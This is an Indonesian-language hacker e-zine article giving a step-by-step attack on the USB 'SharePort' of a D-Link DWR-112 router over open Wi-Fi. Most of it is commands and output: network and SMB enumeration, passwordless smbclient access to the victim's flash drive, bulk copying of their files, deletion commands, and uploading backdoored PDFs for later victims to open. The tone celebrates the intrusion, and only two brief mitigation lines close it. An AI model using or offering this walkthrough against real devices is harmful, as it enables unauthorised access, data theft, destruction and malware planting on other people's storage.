@@ -1,0 +1,509 @@
+ECHO MAGAZINE VOLUME XI, ISSUE XXVII, PHILE 0x04.TXT
+                               :|             ++           
+                     :~~/ .::/ :::| ,::\ >::> :| :::\ :~~/ 
+                     :::, `::\ :|:| `::/ <::< :| :|:| :::, 
+                                                                   
+
+     Hacker Log Book: Abusing D-Link DWR-112 Shareport.
+     lirva32 <at> yahoo <dot> com
+
+
+
+-----| Pendahuluan
+
+SharePort ?  SharePort merupakan teknologi baru yang banyak diterapkan
+pada Access Point model-model terbaru, SharePort merupakan port usb
+yang biasa digunakan untuk Folder Sharing dan Printer Sharing.  
+
+Tujuan adanya SharePort pada Access Point adalah agar user bisa
+mempergunakan media penyimpanannya yang berupa usb Flashdisk secara
+remote melalui wireless, begitu juga dengan sharing printer yang
+diterapkannya agar user bisa melakukan pencetakan secara remote melalui
+wireless juga.
+
+Tanpa kita sadari pada teknologi tersebut sangatlah rentan terhadap
+tindakan penyerangan yang dapat menimbulkan kerugian yang sangat besar,
+yaitu : pencurian data, penghapusan data dan penanaman backdoor.
+
+
+-----| Target Attacking
+ 
+Pada ujicoba kali ini,saya melakukan penyerangan terhadap devices
+dengan spesifikasi, sbb :
+
+ [.] Access Point 	:  D-Link 
+ [.] Series AP		:  DWR-112
+ [.] Firmware version   :  1.04
+ [.] USB Port 1		:  USB Hub yang terkonekasi USB Flashdisk dan Printer
+
+* target tidak hanya terbatas pada devices tersebut, kemungkinan
+devices lain pun bisa menjadi sasaran dengan karakteristik yang sama.
+
+-----| Persiapan Penyerangan 
+
+ . Notebook	: cukup notebook dengan wireless apa saja
+ . OS		: saya mempergunakan BT R3     
+
+---[ Skenario
+
+ 
+     ((( |---------| )))
+         | DWR-112 |                     :------[usb flashdisk]
+         |---------|---------[usb hub] --:
+           target                        :------[printer]
+
+                             o0o
+                             000
+                     :----:   |        
+                     : xx :  /|\
+                     : ---: / | \
+                    notebook  |
+                             / \
+                            /   \
+                           attacker
+
+keterangan :  
+. attacker akan melakukan penyerangan terhadap SharePort yang
+  terdapat pada Access Point melalui wireless 
+. attacker akan masuk kedalam usb flashdisk untuk melakukan pencurian
+  data dan kegiatan lainnya 
+. attacker akan melakukan penyerangan terhadap printer (--akan dibahas 
+  pada tulisan berikutnya)
+
+-----| Melakukan Penyerangan 
+
+1.  Lakukan koneksi ke Access Point (AP) yang menjadi target.
+    Cek koneksi ke AP :
+
+     root@bt:~# iwconfig 
+     lo        no wireless extensions.
+
+     wlan0     IEEE 802.11abg  ESSID:"lirva32_was_here"  
+               Mode:Managed  Frequency:2.457 GHz  Access Point: C8:BE:19:8C:37:A4   
+               Bit Rate=24 Mb/s   Tx-Power=15 dBm   
+               Retry  long limit:7   RTS thr:off   Fragment thr:off
+               Encryption key:off
+               Power Management:off
+               Link Quality=70/70  Signal level=-24 dBm  
+               Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+               Tx excessive retries:0  Invalid misc:0   Missed beacon:0
+
+     eth0      no wireless extensions.
+
+2.  Setelah koneksi berhasil, maka kita akan mendapatkan IP dari DHCP
+    server.  Sudah menjadi kebiasaan jika AP didirikan selalu saja DHCP
+    juga didirikan dengan tujuan untuk mempermudah user melakukan koneksi
+    ke wireless AP.  Cek dapat IP berapa dari DHCP Server :
+
+     root@bt:~# ifconfig
+     eth0      Link encap:Ethernet  HWaddr 00:1d:72:19:45:4d  
+               UP BROADCAST MULTICAST  MTU:1500  Metric:1
+               RX packets:0 errors:0 dropped:0 overruns:0 frame:0
+               TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+               collisions:0 txqueuelen:1000 
+               RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
+               Interrupt:16 
+
+     lo        Link encap:Local Loopback  
+               inet addr:127.0.0.1  Mask:255.0.0.0
+               inet6 addr: ::1/128 Scope:Host
+               UP LOOPBACK RUNNING  MTU:16436  Metric:1
+               RX packets:474 errors:0 dropped:0 overruns:0 frame:0
+               TX packets:474 errors:0 dropped:0 overruns:0 carrier:0
+               collisions:0 txqueuelen:0 
+               RX bytes:145389 (145.3 KB)  TX bytes:145389 (145.3 KB)
+
+     wlan0     Link encap:Ethernet  HWaddr 00:1c:bf:00:5e:fb  
+               inet addr:192.168.0.100  Bcast:192.168.0.255  Mask:255.255.255.0
+               inet6 addr: fe80::21c:bfff:fe00:5efb/64 Scope:Link
+               UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+               RX packets:1464 errors:0 dropped:0 overruns:0 frame:0
+               TX packets:53 errors:0 dropped:0 overruns:0 carrier:0
+               collisions:0 txqueuelen:1000 
+               RX bytes:161210 (161.2 KB)  TX bytes:7250 (7.2 KB)
+  
+
+     Nah, devices kita (wlan0) sudah mendapat IP dari DHCP, yaitu :
+     192.168.0.100 /24
+
+3.  Network Scannning, yuk mang kita lakukan network scanning untuk
+    mendapatkan target dengan baik dan benar. Tadi kita sudah mendapatkan
+    IP untuk wlan0 kan...?? yaitu : 192.168.0.100 /24, maka kita akan
+    lakukan proses network scanning 1 range IP yaitu : 192.168.0.1 -
+    192.168.0.254.
+ 
+     root@bt:~# nmap -T4 -F 192.168.0.0/24
+
+     Starting Nmap 6.25 ( http://nmap.org ) at 2013-03-26 10:26 WIT
+     Nmap scan report for 192.168.0.1
+     Host is up (0.0081s latency).
+     Not shown: 95 closed ports
+     PORT      STATE SERVICE
+     53/tcp    open  domain
+     80/tcp    open  http
+     139/tcp   open  netbios-ssn
+     445/tcp   open  microsoft-ds
+     49152/tcp open  unknown
+     MAC Address: C8:BE:19:87:37:A4 (Unknown)
+
+     Nmap scan report for 192.168.0.100
+     Host is up (0.000021s latency).
+     Not shown: 99 closed ports
+     PORT   STATE SERVICE
+     80/tcp open  http
+
+     Nmap done: 256 IP addresses (2 hosts up) scanned in 34.24 seconds
+
+
+     Wah, perlu perhatian khusus nih, ayo diperhatikan :
+     * Port 139/tcp open netbios-ssn.
+       Port ini merupakan port Netbios Session Service yang biasanya
+       digunakan untuk resource sharing pada windows.  
+       Contohnya adalah: Folder n File Sharing, Printer Sharing.
+
+     * Port 445/tcp open microsoft-ds.
+       Port ini merupakan port Microsoft Directory Services yang
+       biasanya digunakan untuk windows file sharing dan menyediakan
+       bayak layanan lainnya.  Port 445/ tcp juga ada sangkutannya
+       dengan SMB over IP (SMB is known as "Samba").
+
+     Kedua Port tersebut yaitu : 139/tcp dan 445/tcp  merupakan port
+     yang sejak dulu dikenal sangat rentan untuk diserang.
+
+
+
+4.  Mari kita lakukan proses scaning yang lebih mendalam terhadap IP
+    yang sudah ditargetkan untuk mendapatkan informasi yang lebih lengkap
+    lagi.
+
+     root@bt:~# nmap -p 1-65535 -T4 -A -v 192.168.0.1
+
+     Starting Nmap 6.25 ( http://nmap.org ) at 2013-03-26 10:57 WIT
+     NSE: Loaded 106 scripts for scanning.
+     NSE: Script Pre-scanning.
+     Initiating ARP Ping Scan at 10:57
+     Scanning 192.168.0.1 [1 port]
+     Completed ARP Ping Scan at 10:57, 0.00s elapsed (1 total hosts)
+     Initiating Parallel DNS resolution of 1 host. at 10:57
+     Completed Parallel DNS resolution of 1 host. at 10:57, 13.00s elapsed
+     Initiating SYN Stealth Scan at 10:57
+     Scanning 192.168.0.1 [65535 ports]
+     Discovered open port 53/tcp on 192.168.0.1
+     Discovered open port 80/tcp on 192.168.0.1
+     Discovered open port 139/tcp on 192.168.0.1
+     Discovered open port 445/tcp on 192.168.0.1
+     Discovered open port 49152/tcp on 192.168.0.1
+     Completed SYN Stealth Scan at 10:58, 32.92s elapsed (65535 total ports)
+     Initiating Service scan at 10:58
+     Scanning 5 services on 192.168.0.1
+     Completed Service scan at 10:58, 11.22s elapsed (5 services on 1 host)
+     Initiating OS detection (try #1) against 192.168.0.1
+     NSE: Script scanning 192.168.0.1.
+     Initiating NSE at 10:58
+     Completed NSE at 10:58, 7.50s elapsed
+     Nmap scan report for 192.168.0.1
+     Host is up (0.0031s latency).
+     Not shown: 65529 closed ports
+     PORT      STATE    SERVICE     VERSION
+     1/tcp     filtered tcpmux
+     53/tcp    open     domain      dnsmasq 2.45
+     | dns-nsid: 
+     |_bind.version: dnsmasq-2.45
+       80/tcp    open     http?
+     |_http-favicon: Unknown favicon MD5: 107579220745D3B21461C23024D6C4A3
+     |_http-methods: No Allow or Public header in OPTIONS response (status code 501)
+     |_http-title: D-LINK SYSTEMS, INC. | WIRELESS ROUTER | HOME
+       139/tcp   open     netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+       445/tcp   open     netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+       49152/tcp open     unknown
+      -
+      - 
+      -
+      SF:99\x2017:22:07\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:\
+      SF:x20\x20\x20127\r\n\r\n<title>501\x20Not\x20Implemented</title>\n<h1>501
+      SF:\x20Not\x20Implemented</h1>\nYour\x20request\x20was\x20not\x20understoo
+      SF:d\x20or\x20not\x20allowed\x20by\x20this\x20server\.\n");
+      MAC Address: C8:BE:19:87:37:A4 (Unknown)
+      Device type: general purpose
+      Running: Linux 2.6.X
+      OS CPE: cpe:/o:linux:linux_kernel:2.6
+      OS details: Linux 2.6.17 - 2.6.36
+      Uptime guess: 0.054 days (since Tue Mar 26 09:41:33 2013)
+      Network Distance: 1 hop
+      TCP Sequence Prediction: Difficulty=206 (Good luck!)
+      IP ID Sequence Generation: All zeros
+
+      Host script results:
+      | smb-os-discovery: 
+      |   OS: Unix (Samba 3.0.24)
+      |   NetBIOS computer name: 
+      |   Workgroup: WORKGROUP
+      |_  System time: 2000-01-01T01:22:11+08:00
+      | smb-security-mode: 
+      |   Account that was used for smb scripts: guest
+      |   Share-level authentication (dangerous)
+      |   SMB Security: Challenge/response passwords supported
+      |_  Message signing disabled (dangerous, but default)
+      |_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+      TRACEROUTE
+      HOP RTT     ADDRESS
+      1   3.12 ms 192.168.0.1
+
+      NSE: Script Post-scanning.
+      Read data files from: /usr/local/bin/../share/nmap
+      OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+      Nmap done: 1 IP address (1 host up) scanned in 68.65 seconds
+                 Raw packets sent: 65681 (2.891MB) | Rcvd: 65630 (2.626MB)
+Wooowww, informasi yang kita dapatkan semakin mendalam tentunya, diantaranya :
+*  53/tcp    open     domain      dnsmasq 2.45 
+*  http-title: D-LINK SYSTEMS, INC. | WIRELESS ROUTER | HOME   
+*  139/tcp   open     netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+*  445/tcp   open     netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+*  MAC Address: C8:BE:19:87:37:A4 (Unknown)
+   Device type: general purpose
+   Running: Linux 2.6.X
+   OS CPE: cpe:/o:linux:linux_kernel:2.6
+      *  Host script results:
+         | smb-os-discovery: 
+         |   OS: Unix (Samba 3.0.24)
+         |   NetBIOS computer name: 
+         |   Workgroup: WORKGROUP
+         |_  System time: 2000-01-01T01:22:11+08:00
+         | smb-security-mode: 
+         |   Account that was used for smb scripts: guest
+         |   Share-level authentication (dangerous)
+         |   SMB Security: Challenge/response passwords supported
+         |_  Message signing disabled (dangerous, but default)
+         |_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+      * Ternyata port 139/tcp dan 445/tcp mengaktifkan smbd 3.x dengan
+        nama workgroup : WORKGROUP 
+
+                  
+
+5.  Yuk kita lanjut pada proses berikutnya, yaitu mengidentifikasi smbd 3.x :
+     
+     root@bt:~# nbtscan 192.168.0.1
+     Doing NBT name scan for addresses from 192.168.0.1
+
+     IP address       NetBIOS Name     Server    User             MAC address      
+     ------------------------------------------------------------------------------
+     192.168.0.1      DWR-112          <server>  DWR-112          00-00-00-00-00-00
+
+
+     
+     Lanjut untuk mencari informasi berikutnya :
+
+     root@bt:~# nbtscan -v -s : 192.168.0.1
+     192.168.0.1:DWR-112        �:00U
+     192.168.0.1:DWR-112        �:03U
+     192.168.0.1:DWR-112        �:20U
+     192.168.0.1:DWR-112        �:00U
+     192.168.0.1:DWR-112        �:03U
+     192.168.0.1:DWR-112        �:20U
+     192.168.0.1:WORKGROUP      �:00G
+     192.168.0.1:WORKGROUP      �:1eG
+     192.168.0.1:WORKGROUP      �:00G
+     192.168.0.1:WORKGROUP      �:1eG
+     192.168.0.1:MAC:00-00-00-00-00-00
+
+
+     Wowwww lagi ahhhh... akhirnya kita bisa mendapatkan informasi
+     untuk smbd 3.x, yaitu :
+     *  IP            : 192.168.0.1
+     *  NetBIOS Name  : DWR-112
+     *  Server        : <server>
+     *  User          : DWR-112
+
+
+
+6.  Nah, sekarang saatnya kita lanjut pada proses penyerangan kepada
+    media penyimpanannya :
+
+     root@bt:~# smbclient -L 192.168.0.1
+     Enter root's password: 
+     Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.24]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	Drive_A5        Disk      Device(A) (SanDisk,Firebird USB Flash Drive)
+	IPC$            IPC       IPC Service (DWR-112)
+
+     Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.24]
+
+	Server               Comment
+	---------            -------
+	Workgroup            Master
+	---------            -------
+
+     * ketika diminta password cukup tekan enter saja.
+
+
+     Informasi yang berharga dari proses ini adalah kita bisa
+     mendapatkan :
+     * Sharename 	:  Drive_A5, IPC$
+
+  
+     command :
+
+     root@bt:~# smbclient //NetBIOS Name/Sharename ""
+
+
+     root@bt:~# smbclient //DWR-112/Drive_A5 ""
+     Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.24]
+     Server not using user level security and no password supplied.
+     smb: \> 
+
+     * akhirnya kita masuk kedalam console smb, selamat menikmati coy...;)
+
+
+
+7.  Kini saatnya memperdayai media penyimpanan target melalui smb
+    console :
+
+     root@bt:~# smbclient //DWR-112/Drive_A5 ""
+     Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.24]
+     Server not using user level security and no password supplied.
+     smb: \> help
+     ?              allinfo        altname        archive        blocksize      
+     cancel         case_sensitive cd             chmod          chown          
+     close          del            dir            du             echo           
+     exit           get            getfacl        hardlink       help           
+     history        iosize         lcd            link           lock           
+     lowercase      ls             l              mask           md             
+     mget           mkdir          more           mput           newer          
+     open           posix          posix_encrypt  posix_open     posix_mkdir    
+     posix_rmdir    posix_unlink   print          prompt         put            
+     pwd            q              queue          quit           rd             
+     recurse        reget          rename         reput          rm             
+     rmdir          showacls       setmode        stat           symlink        
+     tar            tarmode        translate      unlock         volume         
+     vuid           wdel           logon          listconnect    showconnect    
+     ..             !              
+     smb: \> 
+
+
+     [01]  Melihat status koneksi ke smb :
+           smb: \> showconnect 
+           //DWR-112/Drive_A5
+
+
+     [02]  Melihat isi usb flashdisk target :
+           smb: \> l
+           .                                   D        0  Thu Jan  1 07:00:00 1970
+           ..                                  D        0  Fri Dec 31 23:00:26 1999
+           CCNA_Preparing                      D        0  Mon Nov  5 17:43:36 2012
+           CCNA_Preparing - Copy               D        0  Mon Nov  5 17:43:36 2012
+           Copy please                         D        0  Wed Dec  5 13:51:24 2012
+           ebook_pilihan                       D  8857314  Sat Nov 10 10:56:02 2012
+           MODUL MIKROTIK                      D        0  Tue Aug  7 10:56:22 2012
+           ModulWiFiOkeh_cetak                 D        0  Mon Dec  3 16:14:22 2012
+           passwordspeedy.txt                         471  Tue Nov 20 00:50:14 2012
+           PENTESTER CAREER.pptx                  3057314  Sat Nov 10 10:56:02 2012
+           -*
+           -*
+           -*  
+           hal.dll                                 134400  Tue Aug  3 20:59:14 2004   
+           Modul DBA.docx                         1027752  Wed Mar 13 15:29:54 2013
+           ModulWireless_okeh_bgt.pdf             4624212  Fri Jan 11 10:40:48 2013
+  
+		60xx1 blocks of size 6xx36. 15141 blocks available
+
+           * isi file tidak semuanya saya tampilkan ;)
+
+     [03]  Mengambil isi usb flasdisk target :
+
+           root@bt:/# mkdir /home/hasil
+           root@bt:/# cd /home/hasil/
+
+           root@bt:/home/hasil# smbclient //DWR-112/Drive_A5 ""
+           Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.24]
+           Server not using user level security and no password supplied
+
+           smb: \> mget *.*
+           Get file 3030-3040.jpg? yes
+           getting file \3030-3040.jpg of size 99947 as 3030-3040.jpg (1162.0 KiloBytes/sec) (average 1162.0 KiloBytes/sec)
+           -
+           -
+           Get file hal.dll? yes
+           getting file \hal.dll of size 134400 as hal.dll (1274.3 KiloBytes/sec) (average 915.5 KiloBytes/sec)
+
+           Get file Modul_Wireless.pdf? yes
+           getting file \Modul_Wireless.pdf of size 5512257 as Modul_Wireless.pdf (2019.2 KiloBytes/sec) 
+           (average 2064.6 KiloBytes/sec)
+           
+           Get file Modul_wokShop2_cetak.doc? yes
+           getting file \Modul_wokShop2_cetak.doc of size 32209354 as Modul_wokShop2_cetak.doc (1850.8 KiloBytes/sec) 
+           (average 1917.6 KiloBytes/sec)
+
+           dst
+
+     [04]  Menghapus isi usb flasdisk target :
+           *kegiatan ini sangat berbahaya, juga mudah diketaui oleh
+           pemiliknya so hati2 saja.
+
+           menghapus 1 file : 
+           ------------------
+           smb: \> del filename.ext
+
+
+	   menghapus folder :
+           ---------------------
+           smb: \> del folder_name\*.*
+           smb: \> rmdir folder_name
+
+
+     [05]  Menanam backdoor ke isi usb flasdisk target :
+           . dowload file pdf dari usb target
+             
+           smb: \ebook_pilihan\> mget *.pdf
+           Get file Modul_wokShop2.pdf? yes
+           getting file \jasakom_workshop2\Modul_wokShop2.pdf of size 5627760 as Modul_wokShop2.pdf (2006.5 KiloBytes/sec) 
+           (average 2006.5 KiloBytes/sec)
+
+           nah, sekarang file *.pdf sudah kita dapatkan, kini saatnya
+           file *.pdf tersebut Anda sisipkan backdoor.  Maaf, saya
+           tidak menulis bagaimana menyisipkan backdoor kedalam *.pdf,
+           silahkan dicari saja di google ;)
+          
+           Setelah *.pdf Anda sisipkan backdoor, sekarang tinggal kita
+           masukan saja *.pdf tersebut melalui smb console :
+
+           smb: \ebook_pilihan\> mput *.pdf
+           Put file Modul_wokShop2.pdf? yes
+           putting file Modul_wokShop2.pdf as \jasakom_workshop2\Modul_wokShop2.pdf (1245.9 kb/s) (average 1245.9 kb/s)
+           -
+           -
+           -
+           Put file MICROSOFT  SQL SERVER 7.pdf? yes
+           putting file MICROSOFT  SQL SERVER 7.pdf as \jasakom_workshop2\MICROSOFT  SQL SERVER 7.pdf (1124.3 kb/s) 
+           (average 1209.3 kb/s)
+            
+           Selesai sudah penanaman backdoor dilakukan, tinggal tunggu
+           waktu saja..backdoor tersebut akan bekerja sesuai dengan
+           trigger yang telah ditetapkan ;) lol
+
+-----|  Melakukan Pengamanan :
+
+Ada beberapa cara untuk mengurangi ketidak amanan, hanya mengurani saja
+kok, yaitu : 
+1. Usahakan untuk tidak mempergunakan fasilitas shareport terhadap usb
+   flashdisk yg kita miliki 
+2. Amankan koneksi wireless AP dengan WPS, WPA2 dan MAC Filter agar
+   wireless kita tidak dipergunakan oleh pemakai yang tidak jelas.
+
+-----|  Referensi :
+[1] http://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
+
+
+-----|  Greetz :
+
+[1] Echo|Staff 
+[2] MyDaughter : Faiza Debian dan Fivana Gutsy "Anakku...ini dunia ayahmu.. tidak usah malu !! :)"
+[3] Kang Arif s4kitj1wa, Flexus, SheraYusuf, etc
+[4] Asistenku : Rouda, Roso n Rahmad... thx for everythings.....
+[5] AllMyStudent@STMIK Bina Insani : kalian bisa menjadi apa yang kalian inginkan..belajarlah..!!!  
+[6] GXRG, RNDC, MyAlmamater : FTI_Univ_Budi_Luhur, IndonesianLockPicking.
+          
+
